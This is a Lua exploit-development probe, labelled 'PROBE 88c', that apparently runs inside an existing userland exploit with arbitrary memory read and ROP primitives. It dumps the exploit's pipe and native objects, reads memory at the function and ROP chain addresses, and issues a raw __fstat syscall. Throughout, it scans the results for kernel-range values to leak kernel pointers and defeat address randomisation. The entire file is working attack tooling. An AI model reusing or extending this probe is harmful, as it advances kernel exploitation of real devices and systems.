-- CRASH_CLASS: LOW
-- PROBE 88c: Hunt kernel pointers from pipe/native structures

print("=== PROBE 88c ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

print("pid=" .. to_num(syscall.getpid()))

-- PART A: Dump all pipe/syscall object fields
print("--- PIPE OBJECT ---")
local pipe_str = tostring(syscall.pipe)
print("pipe=" .. pipe_str)
for k, v in pairs(syscall.pipe) do
    local h, l = get_hi_lo(v)
    if type(v) == "table" or type(v) == "userdata" then
        print(string.format("  %s = %s (h=0x%X l=0x%X)", tostring(k), tostring(v), h, l))
    else
        print(string.format("  %s = %s", tostring(k), tostring(v)))
    end
end

-- PART B: Extract all addresses from pipe string repr
print("")
print("--- PIPE ADDRESSES ---")
for name, addr in pipe_str:gmatch("([%w_%.]+):%s*(0x[0-9a-fA-F]+)") do
    print("  " .. name .. " = " .. addr)
end

-- PART C: Read the native table for any kernel-range addresses
print("")
print("--- NATIVE TABLE ---")
for k, v in pairs(native) do
    if type(v) ~= "function" then
        local h, l = get_hi_lo(v)
        print(string.format("  %s = %s (h=0x%X l=0x%X)", tostring(k), tostring(v), h, l))
        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
            print("  *** KERNEL POINTER! ***")
        end
    else
        print("  " .. tostring(k) .. " = function")
    end
end

-- PART D: Read around the fn_addr address (ROP metadata)
print("")
print("--- FN_ADDR REGION ---")
local fn_str = pipe_str:match("fn_addr:%s*(0x[0-9a-fA-F]+)")
if fn_str then
    local fn_addr = uint64(fn_str)
    -- Read 256 bytes around fn_addr
    local ok, data = pcall(native.read_buffer, fn_addr, 256)
    if ok and data then
        print("read " .. #data .. " bytes at fn_addr")
        local kcount = 0
        for i = 1, #data - 7, 8 do
            local b1,b2,b3,b4,b5,b6,b7,b8 = data:byte(i,i+7)
            local lo = b1+b2*256+b3*65536+b4*16777216
            local hi = b5+b6*256+b7*65536+b8*16777216
            if hi ~= 0 or lo ~= 0 then
                local tag = ""
                if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                    tag = " KPTR!"
                    kcount = kcount + 1
                end
                print(string.format("  +0x%02X: 0x%08X%08X%s", i-1, hi, lo, tag))
            end
        end
        print("kptr_fn=" .. kcount)
    else
        print("fn_addr read fail")
    end
end

-- PART E: Read the ROP chain area
print("")
print("--- ROP CHAIN ---")
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
if rop_str then
    local rop_addr = uint64(rop_str)
    local ok, data = pcall(native.read_buffer, rop_addr, 256)
    if ok and data then
        print("read " .. #data .. " bytes at ropchain")
        local kcount = 0
        for i = 1, #data - 7, 8 do
            local b1,b2,b3,b4,b5,b6,b7,b8 = data:byte(i,i+7)
            local lo = b1+b2*256+b3*65536+b4*16777216
            local hi = b5+b6*256+b7*65536+b8*16777216
            if hi ~= 0 or lo ~= 0 then
                local tag = ""
                if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                    tag = " KPTR!"
                    kcount = kcount + 1
                end
                if i <= 129 then
                    print(string.format("  +0x%02X: 0x%08X%08X%s", i-1, hi, lo, tag))
                end
            end
        end
        print("kptr_rop=" .. kcount)
    end
end

-- PART F: Try fstat via make_syscall (sys 551 = __fstat)
print("")
print("--- FSTAT ON FD 3 ---")
local statbuf = memory.alloc(0x100)
for i = 0, 0xFC, 4 do memory.write_dword(statbuf + i, 0) end
local sc_fstat = make_syscall(551)
local ok_f, ret_f = pcall(function() return sc_fstat(uint64(3), uint64(statbuf)) end)
print("fstat(3) ok=" .. tostring(ok_f) .. " ret=" .. tostring(ret_f))
if ok_f then
    for off = 0, 0x60, 8 do
        local lo = to_num(memory.read_dword(statbuf + off))
        local hi = to_num(memory.read_dword(statbuf + off + 4))
        if hi ~= 0 or lo ~= 0 then
            local tag = ""
            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then tag = " KPTR!" end
            print(string.format("  +0x%02X: 0x%08X%08X%s", off, hi, lo, tag))
        end
    end
end

print("=== PROBE 88c COMPLETE ===")
